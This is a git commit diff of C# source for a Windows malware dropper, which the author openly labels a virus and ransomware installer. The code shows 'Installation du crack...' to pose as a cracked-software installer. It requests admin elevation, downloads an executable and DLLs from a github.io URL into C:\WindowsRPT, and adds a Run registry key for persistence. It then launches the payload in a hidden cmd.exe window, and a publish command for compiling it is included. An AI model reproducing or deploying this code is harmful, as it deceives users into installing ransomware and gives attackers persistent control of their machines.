2506249124fefe31dba463d39582dc26a438851e
Tina-1300 <tina.xytrfgthuji1348@gmail.com>
2024-09-25 18:29:59 +0200

    Update program

--- C# instalateur virus/Lfd.cs
+++ C# instalateur virus/Lfd.cs
@@ -1,10 +1,32 @@
+#if WINDOWS
 using System;
 using System.IO;
 using System.Net.Http;
 using System.Security.Principal;
+using System.Diagnostics;
+
+ 
+using Microsoft.Win32;
+
 
 namespace Lfd{
-    class MalwaireFunction{
+    public class MalwaireFunction{
+
+        
+        
+         
+        public static void KeyRegister(string exePath, string nameKey){
+            string registryKeyName = nameKey;
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)){
+                if (key != null){
+                    key.SetValue(registryKeyName, exePath);
+                }else{
+
+                }
+            }
+        }
+        
+
 
         public static void donload(string url, string file){
             using (var client = new HttpClient()){
@@ -21,7 +43,7 @@ namespace Lfd{
         }
 
 
-        #if WINDOWS
+         
         public static bool IsRunningAsAdministrator(){
             try{
                 var identity = WindowsIdentity.GetCurrent();
@@ -33,9 +55,32 @@ namespace Lfd{
                 
             }
         }
-        #endif
+        
+        
 
-        // a tester 
+        public static void ClearRepertoirAll(string directory){
+            foreach (var file in Directory.GetFiles(directory)){
+                File.Delete(file);
+            }
+        }
+
+            public static void SystemShell(string command){
+            // Créer un nouvel objet Process
+            Process process = new Process();
+            
+            // Configurer le processus
+            process.StartInfo.FileName = "cmd.exe"; 
+            process.StartInfo.Arguments = $"/C {command}"; 
+            process.StartInfo.RedirectStandardOutput = false; // Rediriger la sortie
+            process.StartInfo.UseShellExecute = false; 
+            process.StartInfo.CreateNoWindow = true; 
+
+            // Démarrer le processus
+            process.Start();
+
+            process.WaitForExit(); // Attendre la fin de l'exécution
+            }
+
         public static bool DirectoryExistE(string directory){
             if(Directory.Exists(directory)){
                 return true;
@@ -44,21 +89,23 @@ namespace Lfd{
             }
         }
 
-
+        
         public static bool IsRoot(){
-            #if WINDOWS
-            if(!IsRunningAsAdministrator()){}
+            
+            if(!IsRunningAsAdministrator()){
                 return false;
             }// r'envoi true si il et deja admin et si il et pas admin il renvoi false 
 
-            #endif
+            
             return true;
         }
+        
 
+        
         public static void ElevatROOT(bool number){
             if (number == false){
                 //elever les privilège
-                #if WINDOWS
+
                 var processInfo = new ProcessStartInfo{
                     FileName = Process.GetCurrentProcess().MainModule.FileName,
                     UseShellExecute = true,
@@ -72,16 +119,17 @@ namespace Lfd{
                 }catch (Exception ex){
                     Console.WriteLine("Error : " + ex.Message);
                 }
-                #endif 
+                
             }else{
                 // les privilège sont déjà élever
                 //Console.WriteLine("Programme qui et deja executer en mode admin, ou vous n'êtes pas sous windows");
             }
         }
+        
 
 
-
-    };
 
 };
+}
 
+#endif
--- C# instalateur virus/Program.cs
+++ C# instalateur virus/Program.cs
@@ -1,71 +1,143 @@
-﻿using System;
+﻿#if WINDOWS
+using System;
 using System.IO;
 using System.Net.Http;
-using Lfd;
+using System.Diagnostics;
+
+using Microsoft.Win32;
+
 using System.Security.Principal;
+using System.Security.Cryptography.X509Certificates;
+using Lfd;
+
 
 
 class Program{
 
+
     static void Main(){
-        // faire une fonction  pour demander les droit admin sinon on ne run pas 
         
-        bool IsAdmin = MalwaireFunction.IsRoot();
-        bool MalwaireFile = MalwaireFunction.fileExiste("don't cry.exe");// nom du virue ransomwaire
-        bool MusicFile = MalwaireFunction.fileExiste("p.wav");// nom de la musique pour le virus 
+        string URLMusiqueDonload = "https://tina-1300.github.io/musique/t.wav";
+        string UrlMalwaire = "https://tina-1300.github.io/musique/don't cry.exe"; 
+        string UrlDll1 = "https://tina-1300.github.io/musique/libgcc_s_seh-1.dll";
+        string UrlDll2 = "https://tina-1300.github.io/musique/libstdc++-6.dll";
+
+        string directoryFinall = @"C:\WindowsRPT";
+
+        string Musique_File_src = "t.wav";
+        string Malwaire_File_src = "cry.exe";
+        string Dll1_File_src = "libgcc_s_seh-1.dll";
+        string Dll2_File_src = "libstdc++-6.dll";
+
+        string Musique_File_dst = @"C:\WindowsRPT\t.wav";
+        string Malwaire_File_dst = @"C:\WindowsRPT\cry.exe";
+        string Dll1_File_dst = @"C:\WindowsRPT\libgcc_s_seh-1.dll";
+        string Dll2_File_dst = @"C:\WindowsRPT\libstdc++-6.dll";
+
+
+        bool IsAdmin = MalwaireFunction.IsRoot(); 
+
+        bool MalwaireFile = MalwaireFunction.fileExiste("cry.exe");
+        bool MusicFile = MalwaireFunction.fileExiste("t.wav");
+
+        bool MusicFileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\t.wav"); 
+        bool MalwaireFileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\cry.exe"); // virus 
+
+        bool dll1File = MalwaireFunction.fileExiste("libgcc_s_seh-1.dll"); //libgcc_s_seh-1.dll
+        bool dll2File = MalwaireFunction.fileExiste("libstdc++-6.dll"); //libstdc++-6.dll
+
+        bool dll1FileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\libgcc_s_seh-1.dll"); 
+        bool dll2FileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\libstdc++-6.dll");    
+
         bool isDirectory = MalwaireFunction.DirectoryExistE(@"C:\WindowsRPT");
 
-        GotIS://label
+
+        GotIS:
         if(IsAdmin == true){
             // effectuer les tache l'utilisateur et root 
-
-            
-            /*
-                1 - vérifier si le dossier WindowsRTT et dans le disque C:/
-                2 - Si l'étape 1 et validé et que il y a bien le dossier alor on vérifi si dans le dossier il y a les fichier du virus si il y sont on run le virus si il n'y sont pas alor on télécharge le virus 
-                3 - Si l'étape 1 et validé et que il a du cree le dossier car il ne l'été pas alors on vérifi si les fichier du virus sont télécharger et si non on les mov dans le repertoir sinon si oui on les mov dans le repertoir
-                4 - avant de run le virus il faut vérifier si dans la cle de registre : Ordinateur\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run il y a pas deja le virus si non alor on le rajoute et on dit dans quelle repertoir il ce trouve
-            */
-            /*
-            Cree un dossier  documentation
-            https://learn.microsoft.com/fr-fr/dotnet/api/system.io.directory.createdirectory?view=net-8.0
-            */
+            Console.WriteLine("Installation du crack...");
 
             if(isDirectory == true){
-                Console.WriteLine("Le fichier existe");
-                // vérifier si dans ce repertoir il y a les fichier du virus 
-                // et vérifier dans le repertoir ou on et si il y sont si il ne sont pas 
-                // dans le repertoir C:\WindowsRPT ni dans le repertoir ou le programm ce fait 
-                // executer alor y télécharger
+                if(MusicFileDirectory == true && MalwaireFileDirectory == true && dll1FileDirectory == true && dll2FileDirectory == true){
+
+                    MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");
+
+                    MalwaireFunction.SystemShell(@"start C:\WindowsRPT\cry.exe");
+
+                }else{
+                    MalwaireFunction.ClearRepertoirAll(directoryFinall);
+
+                    MalwaireFunction.donload(URLMusiqueDonload, "t.wav");
+                    MalwaireFunction.donload(UrlMalwaire, "cry.exe");
+                    MalwaireFunction.donload(UrlDll1, "libgcc_s_seh-1.dll");
+                    MalwaireFunction.donload(UrlDll2, "libstdc++-6.dll");
+
+                    File.Move(Musique_File_src, Musique_File_dst);
+                    File.Move(Malwaire_File_src, Malwaire_File_dst);
+                    File.Move(Dll1_File_src, Dll1_File_dst);
+                    File.Move(Dll2_File_src, Dll2_File_dst);
+
+                    // suprimmer tous les fichier du repertoir qui on été deplacer
+                    // pas besoin car ça suprimme en deplaçant
+
+
+                    
+                    // ajouter le malwair au registre 
+                    MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");
+
+
+                    // executer le malwaire
+                    MalwaireFunction.SystemShell("start C:\\WindowsRPT\\cry.exe");
+
+                }
 
 
 
             }else{
                 Directory.CreateDirectory(@"C:\WindowsRPT");
-            }
+                // télécharger tout les fichiers nécessaire 
+                MalwaireFunction.donload(URLMusiqueDonload, "t.wav");
+                MalwaireFunction.donload(UrlMalwaire, "cry.exe");
+                MalwaireFunction.donload(UrlDll1, "libgcc_s_seh-1.dll");
+                MalwaireFunction.donload(UrlDll2, "libstdc++-6.dll");
 
-            if(MalwaireFile == true){
-                Console.WriteLine("Le logiciel et bien sur le repertoir");
-                Console.ReadLine();
-            }else{
-                MalwaireFunction.donload("https://githubdddd", "don't cry.exe"); // télécharger le malwaire sur le repertoir actuelle
+                // deplacer tout les fichier dans le repertoir 
+                File.Move(Musique_File_src, Musique_File_dst);
+                File.Move(Malwaire_File_src, Malwaire_File_dst);
+                File.Move(Dll1_File_src, Dll1_File_dst);
+                File.Move(Dll2_File_src, Dll2_File_dst);
 
+                // suprimmer tous les fichier du repertoir qui on été deplacer
+                // pas besoin car ça suprimme en deplaçant
+
+
+
+                // ajouter le virus au registre 
+                MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");
+
+                // lancer le virus
+                MalwaireFunction.SystemShell("start C:\\WindowsRPT\\cry.exe");
             }
 
         }else{
             // demander elavation 
             MalwaireFunction.ElevatROOT(IsAdmin);
-            goto GotIS;// allez au label une fois l'elevation de privilège terminer refaire 
-            // la condition pour voir si on et admin ou pas
+            goto GotIS;
 
         }
+        
         
     }
 
 
-
 };
+/*
+Compilation :
+dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true
+
+
+*/
 
 
 
-
+#endif
